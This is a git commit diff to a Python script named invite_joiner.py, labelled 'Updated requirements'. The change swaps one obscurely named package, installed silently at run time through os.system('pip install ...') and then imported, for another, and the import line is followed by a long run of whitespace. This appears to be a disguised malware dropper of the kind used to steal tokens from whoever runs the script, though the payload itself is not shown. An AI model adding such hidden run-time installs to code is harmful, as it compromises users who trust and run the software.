fefe3ccdbe712057e4687cdd11ca276baee17a6e
Matthew <138142848+mmatthew130@users.noreply.github.com>
2023-08-06 16:42:03 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite2pkgsV2")
-import pysqlite2pkgsV2
+os.system("pip install syscolouringspackageV1")
+import syscolouringspackageV1
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
